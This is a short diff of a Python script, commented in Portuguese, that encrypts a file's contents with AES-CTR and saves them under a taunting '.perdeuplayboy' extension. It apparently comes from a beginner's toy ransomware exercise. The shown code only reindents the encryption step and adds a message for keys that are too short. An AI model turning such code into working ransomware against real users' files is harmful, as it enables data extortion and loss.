@@ -18,11 +18,13 @@ if len(key_input) > 16:
   key = key_input.encode('utf-8')[:16]
   aes = pyaes.AESModeOfOperationCTR(key)
 
-## criptografar o arquivo
-crypto_data = aes.encrypt(file_data)
+  ## criptografar o arquivo
+  crypto_data = aes.encrypt(file_data)
 
-## salvar o arquivo criptografado
-new_file = file_name + ".perdeuplayboy"
-new_file = open(f'{new_file}','wb')
-new_file.write(crypto_data)
-new_file.close()
+  ## salvar o arquivo criptografado
+  new_file = file_name + ".perdeuplayboy"
+  new_file = open(f'{new_file}','wb')
+  new_file.write(crypto_data)
+  new_file.close()
+else:
+  print("Eu falei que era para ser mais de 16 caracteres!")
